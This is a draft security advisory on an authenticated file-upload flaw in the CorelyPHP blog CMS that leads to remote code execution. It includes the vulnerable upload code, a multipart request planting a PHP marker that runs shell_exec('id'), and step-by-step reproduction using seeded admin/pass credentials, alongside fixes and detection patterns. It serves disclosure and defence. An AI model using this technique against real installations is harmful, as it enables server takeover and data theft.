# Security Advisory — Authenticated Arbitrary File Upload leading to Remote Code Execution in CorelyPHP

**Internal ID:** RS-ADV-2026-018
**CVE:** pending (not assigned)
**Status:** draft for disclosure

---

## 1. Executive summary

An **Authenticated Arbitrary File Upload → Remote Code Execution** vulnerability was identified in the administrative panel of *CorelyPHP* (`Dominik-developer/CorelyPHP`), in `admin/algo/new.alg.php` (article creation, field `photoUpload`) and `admin/algo/edit.alg.php` (article editing, field `new_photo`). The handlers sanitise only the base name of the client-supplied filename and append the **client-supplied extension verbatim** (`pathinfo(...)["extension"]`), with no server-side allow-list, MIME or content check; the file is then written to `/articles_photos/`, a directory inside the web root where the web server executes PHP. The only restriction is the HTML `accept="image/png, image/jpeg"` attribute, which is enforced by the browser only. An authenticated administrator can therefore upload a `.php` file as an "article photo" and execute arbitrary code with the web-server's privileges. Execution was **confirmed live** in an isolated lab (Docker / OrbStack): a benign marker uploaded as `corely_poc_<ts>.php` returned the output of `id` (`uid=33(www-data)`).

---

## 2. Affected products

- **Product:** CorelyPHP — PHP CMS for blogs (`Dominik-developer/CorelyPHP`)
- **Analyzed version:** `v1.2.0` (latest tag, commit `3d2b3f4`, 2025-03-14); the same code is present in `v1.1.0` (commit `483762f`, 2025-02-25). Both are listed as *supported* in the project's `SECURITY.md`.
- **Component:** `admin/algo/new.alg.php` (lines 92-121) and `admin/algo/edit.alg.php` (lines 117-142)
- **Endpoints:**
  - `POST /admin/algo/new.alg.php` (multipart; fields `title`, `textUpload`, `photoUpload`)
  - `POST /admin/algo/edit.alg.php` (multipart; fields `id`, `new_title`, `new_text`, `new_photo`)
- **Access vector:** authenticated administrative panel (`/admin/`) — https://github.com/Dominik-developer/CorelyPHP

**Unaffected products/versions:** not assessed. The analysis was limited to the versions above.

---

## 3. Vulnerability description

In `admin/algo/new.alg.php` (lines 92-121), after the article title is checked for uniqueness, the uploaded "photo" is stored as follows:

```php
92   $pathinfo = pathinfo($_FILES["photoUpload"]["name"]);
94   $base = $pathinfo["filename"];
96   $base = preg_replace("/[^\w-]/", "_", $base);          // sanitises the BASE NAME only
98   $filename = $base . "." . $pathinfo["extension"];      // extension kept as sent by the client
100  $destination = dirname(__DIR__, 2) . "/articles_photos/" . $filename;
...
114  if ( ! move_uploaded_file($_FILES["photoUpload"]["tmp_name"], $destination)) {
...
121  $target_file = 'articles_photos/'.$filename;
```

`admin/algo/edit.alg.php` (lines 118-134) repeats the same logic for `$_FILES["new_photo"]`.

- **Source:** `$_FILES["photoUpload"]["name"]` (new.alg.php, line 92) and `$_FILES["new_photo"]["name"]` (edit.alg.php, line 118) — the client-supplied filename, including its extension.
- **Sink:** `move_uploaded_file()` into `<webroot>/articles_photos/<base>.<extension>` (new.alg.php line 114; edit.alg.php line 134), followed by execution by the web server when the file is requested at `/articles_photos/<base>.<extension>`.
- **Missing sanitization:** no extension allow-list or block-list; no verification of the real content (`finfo_file()`, `getimagesize()`); the client-supplied `$_FILES[...]["type"]` is not even consulted; the file is not re-encoded; the stored name is predictable (it is the original base name).
- **Only restriction:** the size limit (`> 1048576` bytes is rejected, line 66) and the HTML attribute `accept="image/png, image/jpeg"` in `admin/window_functions.php` (line 83). The latter is a browser-side file-picker hint and does not constrain a crafted multipart request.
- **Relevant observation:** CorelyPHP ships no `.htaccess` or server rule for `articles_photos/`. On the deployment documented in `HOW_TO_RUN.md` (repository placed in XAMPP/MAMP `htdocs`), as on any standard Apache + mod_php or nginx + PHP-FPM setup, `.php` files under that directory are executed.
- **Null byte:** not applicable; the dangerous extension is accepted directly.

**Required conditions:** an authenticated administrator session; a web server that executes PHP under `/articles_photos/` (the default for the documented deployment).

---

## 4. Impact (C/I/A)

- **Confidentiality (High):** arbitrary code execution allows reading any file reachable by the web-server user, including `admin/panel.connect.php` (database credentials, shipped as `root` / `root`) and the full database (admin password hash, articles, visitor tracking data).
- **Integrity (High):** the attacker can modify or replace application files, themes, articles and database contents (e.g. persistently inject malicious JavaScript into every public page).
- **Availability (High):** the attacker can delete files or data, or take the service offline.

The administrative privilege required is weakly protected in practice: the shipped seed data (`database_SQL/blog_DB_data.sql`) creates the account `admin` / `pass`, documented in `HOW_TO_RUN.md`, and the login handler has no rate limiting or lockout (see §14). In addition, deleting an article does not remove its photo file, so an uploaded payload persists after the article is removed.

---

## 5. Classification

- **CWE:** CWE-434 — Unrestricted Upload of File with Dangerous Type; additional: CWE-552 — Files or Directories Accessible to External Parties (uploads stored and executed inside the web root)
- **CAPEC:** CAPEC-650 — Upload a Web Shell to a Web Server
- **CVSS v3.1 (base):** **7.2 (High)**
  `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`
  - *Note:* PR:H because the endpoints require an administrator session (the application has a single, administrator-only role). On installations that keep the documented default credentials (`admin` / `pass`), the privilege is trivially obtainable over the network without prior knowledge; scored with PR:N, the vector becomes `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8). The base score above follows the strict CVSS definition.

---

## 6. Exploitation scenario

An attacker who holds an administrator session — obtained, for example, through the shipped default credentials or by guessing the password against the unthrottled login — sends `POST /admin/algo/new.alg.php` with any title, any text file, and a `photoUpload` part whose filename ends in `.php` (the declared `Content-Type` may be forged as `image/png`; it is never checked). The server keeps the `.php` extension and writes the file to `/articles_photos/<name>.php`. The attacker then requests that URL; the web server hands it to the PHP interpreter, which executes it with the web-server user's privileges. The same result is reachable through `POST /admin/algo/edit.alg.php` using the `new_photo` field.

---

## 7. Technical evidence

- **Affected component:** `admin/algo/new.alg.php` (lines 92-121) and `admin/algo/edit.alg.php` (lines 117-142)
- **Data flow:**
  - *Source:* `$_FILES["photoUpload"]["name"]` / `$_FILES["new_photo"]["name"]` (client-controlled filename and extension)
  - *Missing sanitization:* base name sanitised with `preg_replace("/[^\w-]/", "_", ...)`, but the extension is appended unchanged; no allow-list, MIME/content check or re-encoding; only a browser-side `accept` attribute
  - *Sink:* `move_uploaded_file()` → `<webroot>/articles_photos/<base>.<ext>` → executed by the web server on request

**7.1. Confirmed Remote Code Execution (live, benign marker)**
Lab: CorelyPHP `v1.2.0` running on `php:8.3-apache` (PHP 8.3.36, Apache 2.4.69) and `mysql:8.4` under Docker / OrbStack (macOS, aarch64), isolated on `localhost`.
After authenticating as `admin`, the following request was sent (abridged):
```http
POST /admin/algo/new.alg.php HTTP/1.1
Host: localhost:8080
Cookie: PHPSESSID=<session>
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="title"

PoC RCE 20261118003528
------X
Content-Disposition: form-data; name="textUpload"; filename="poc.txt"
Content-Type: text/plain

Security test.
------X
Content-Disposition: form-data; name="photoUpload"; filename="corely_poc_20261118003528.php"
Content-Type: image/png

<?php /* benign marker: fixed output only, self-deletes on ?cleanup=1 */ ... echo 6*7; echo shell_exec('id'); ...
------X
Content-Disposition: form-data; name="visibility"

on
------X--
```
The server redirected to `panel.php?window=all-articles` (article created). The uploaded file was then requested:
```http
GET /articles_photos/corely_poc_20261118003528.php HTTP/1.1
Host: localhost:8080
```
Response (HTTP 200, executed by the server):
```
=== CorelyPHP - PoC Upload -> RCE (CWE-434) ===

arquivo enviado como FOTO : corely_poc_20261118003528.php
calculo 6*7               : 42
comando 'id'              : uid=33(www-data) gid=33(www-data) groups=33(www-data)
hostname                  : 385fc3214475
sistema                   : Linux 385fc3214475 7.2.12-orbstack-00394-gbecdd6130068 #1 SMP PREEMPT Thu Oct 22 22:17:17 UTC 2026 aarch64
versao PHP                : 8.3.36
caminho no servidor       : /var/www/html/articles_photos/corely_poc_20261118003528.php
data/hora (servidor)      : 2026-11-18 00:35:32 UTC

RESULTADO: codigo PHP executado no servidor.
```
The evaluated arithmetic (`42`) and the output of the operating-system command `id` prove server-side execution of the uploaded file. Screenshot: `poc_rce_corelyphp.jpg`. The marker file was removed afterwards (`?cleanup=1` → HTTP 404) and the test article deleted.

**7.2. Second entry point — `edit.alg.php` (confirmed by source review; live capture pending)**
`admin/algo/edit.alg.php` (lines 118-134) contains the identical extension handling for `$_FILES["new_photo"]`. A request to `POST /admin/algo/edit.alg.php` with an existing `id` and a `new_photo` part named `*.php` is expected to produce the same result. This path was verified by code review only; a live capture should be recorded separately. Note that this handler also deletes the article's previous photo **before** validating the new upload (line 67-69).

> Note: No third-party systems were accessed. All tests used a local, isolated instance and a benign marker (fixed output, no web shell, no parameter-driven command execution).

---

## 8. Proof of concept (PoC)

In an authorized lab environment:

1. Deploy CorelyPHP `v1.2.0` as documented (Apache + PHP + MySQL, repository in the web root) and import `database_SQL/blog_DB_structure.sql` and `blog_DB_data.sql`.
2. Authenticate at `/admin/panel.login.php` (seeded credentials `admin` / `pass`).
3. Create a file `poc.php` with a harmless marker, e.g. `<?php echo "RCE-OK:" . (41 + 1);`
4. In **Add article**, submit any title, any `.txt` file as the article text, and `poc.php` as the article photo (switch the file picker to "All files"; or send the multipart request directly — the server performs no extension check).
5. **Verification:** request `/articles_photos/poc.php`; the response contains `RCE-OK:42`, proving the uploaded PHP executed.
6. Clean up: delete the article in the panel **and** remove `articles_photos/poc.php` from disk (deleting the article does not remove the file).

An automated version of this procedure (login, upload, verification, evidence log and cleanup) is provided as `poc_upload_rce.sh` (`./poc_upload_rce.sh http://localhost:8080`).

**PoC limitations:** requires an administrator session; uses a benign marker (no web shell); does not bypass authentication.

---

## 9. Reproduction steps

1. Log in to the administrative panel (`/admin/`).
2. Open **Add article** (`panel.php?window=add-article`).
3. Upload a file with a `.php` extension in the *Article photo* field and submit.
4. Request `/articles_photos/<filename>.php`.
5. Observe the PHP code executing. Expected secure behaviour: the server rejects non-image files, or stores uploads where they cannot be executed.

---

## 10. Mitigation

- Disable script execution in `articles_photos/` at the web-server level, e.g. for Apache:
  ```apache
  <Directory "/path/to/CorelyPHP/articles_photos">
      php_admin_flag engine off
      <FilesMatch "\.(php\d?|phtml|phar|phps)$">
          Require all denied
      </FilesMatch>
  </Directory>
  ```
  (or an equivalent nginx `location` that never passes `/articles_photos/` to PHP-FPM).
- Change the default `admin` / `pass` credentials immediately after installation.
- Restrict access to `/admin/` (e.g. by IP or an additional authentication layer).
- Inspect `articles_photos/` for files with executable extensions and remove them.

---

## 11. Fix

Validate uploads on the server against an allow-list of image types, using the real file content, and generate the stored name server-side, for example:

```php
$allowed = [
    'image/jpeg' => 'jpg',
    'image/png'  => 'png',
    'image/webp' => 'webp',
];

$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime  = $finfo->file($_FILES['photoUpload']['tmp_name']);

if (!isset($allowed[$mime]) || getimagesize($_FILES['photoUpload']['tmp_name']) === false) {
    $_SESSION['message'] = 'Only JPG, PNG or WEBP images are allowed.';
    header('Location: ../panel.php?window=add-article');
    exit();
}

// Never reuse the client-supplied name or extension
$filename    = bin2hex(random_bytes(16)) . '.' . $allowed[$mime];
$destination = dirname(__DIR__, 2) . '/articles_photos/' . $filename;
```

Apply the same change to `edit.alg.php` (`new_photo`), and only delete the previous photo after the new one has been validated and stored. Complementary measures: re-encode images (e.g. with GD/Imagick) to strip embedded payloads; ship a server rule (`.htaccess`) disabling PHP execution in `articles_photos/`; remove the photo file when an article is deleted (`admin/algo/delate.alg.php`); stop the processing flow after a failed `move_uploaded_file()` (new.alg.php line 114 currently continues to insert the article).

### Implemented change

[To be completed if/when the vendor releases a fix.]

---

## 12. Detection and indicators

- Files with executable extensions under `articles_photos/`:
  ```
  find /path/to/CorelyPHP/articles_photos -type f \( -iname '*.php*' -o -iname '*.phtml' -o -iname '*.phar' \)
  ```
- Requests to PHP files under `/articles_photos/` in the access log, and photo paths ending in `.php` in the database:
  ```
  grep -E "GET /articles_photos/[^ ]*\.(php[0-9]?|phtml|phar)" access.log
  SELECT ID, title, photo_path FROM articles WHERE photo_path NOT REGEXP '\\.(jpe?g|png|webp)$';
  ```
- `POST /admin/algo/new.alg.php` or `/admin/algo/edit.alg.php` immediately followed by a `GET` to a new file under `/articles_photos/`.

---

## 13. Disclosure timeline

| Date | Event |
|------|-------|
| 2026-11-17 | Source code identification and analysis (`v1.2.0`; `v1.1.0` also affected) |
| 2026-11-17 | Remote code execution confirmed live in an isolated lab (benign marker) |
| 2026-11-17 | Advisory drafting |
| _pending_ | Vendor contact |
| _pending_ | Vendor confirmation |
| _pending_ | Fix availability |
| _pending_ | Public disclosure |

---

## 14. Vendor communication

- **Intended channel:** GitHub issue at https://github.com/Dominik-developer/CorelyPHP, as required by the project's `SECURITY.md` (title containing "Vulnerability", affected part — *admin* — and severity; tag the maintainer `Dominik-developer`; one vulnerability per issue). The policy publishes no private channel, so consider requesting one before posting exploitation details publicly (e.g. via GitHub's private vulnerability reporting, if enabled).
- **Status:** _pending opening._

> Additional observations in the same codebase, to be assessed separately (all confirmed in the same lab):
> - **Default credentials and no brute-force protection** — `database_SQL/blog_DB_data.sql` seeds `admin` / `pass`; `admin/panel.login.alg.php` has no rate limiting or lockout (10 consecutive failed attempts followed by a successful login, with no delay).
> - **Stored XSS** — article `title` and `text` are printed without `htmlspecialchars()` in `public/handlers/functions.php` (`all_articles()`, lines 39 and 47) and in the admin views (`admin/all_articles.alg.php`, `admin/window_functions.php`, `editArticle()`).
> - **Missing CSRF protection** — no anti-CSRF token on any state-changing admin form (`new.alg.php`, `edit.alg.php`, `delate.alg.php`, `theme.alg.php`, `service_status.alg.php`, `password.alg.php`).
> - **Session cookie without `HttpOnly`** — the session cookie is readable by JavaScript, which, combined with the stored XSS, enables session theft.
> - **Orphaned uploads** — `admin/algo/delate.alg.php` deletes the database row but not the photo file.

---

## 15. Credits

The vulnerability was identified and reported by:

- **Researcher:** Kembolle Amilkar
- **Contact:** contato@kembolle.com.br
- **Profile:** https://github.com/Kembolle

---

## 16. References

- CWE-434: https://cwe.mitre.org/data/definitions/434.html
- CWE-552: https://cwe.mitre.org/data/definitions/552.html
- CAPEC-650: https://capec.mitre.org/data/definitions/650.html
- OWASP — Unrestricted File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- OWASP — File Upload Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- PHP — `finfo::file()`: https://www.php.net/manual/en/finfo.file.php
- CVSS v3.1 calculator: https://www.first.org/cvss/calculator/3.1
- NVD (product search): https://nvd.nist.gov/vuln/search?keyword=CorelyPHP&resultType=records
- Project: https://github.com/Dominik-developer/CorelyPHP
- Affected release: https://github.com/Dominik-developer/CorelyPHP/releases/tag/v1.2.0

---

## 17. Revision history

| Version | Date | Change |
|---------|------|--------|
| 1.0 | 2026-11-17 | Initial version (unified: static analysis + live PoC evidence) |

---

## 18. Legal notice

This advisory is for **educational and defensive** purposes. Testing was conducted in an authorized, controlled lab environment. It must not be used to access systems without explicit authorization.

---

## 19. Contact

- **Researcher:** Kembolle Amilkar / kembolle.com.br
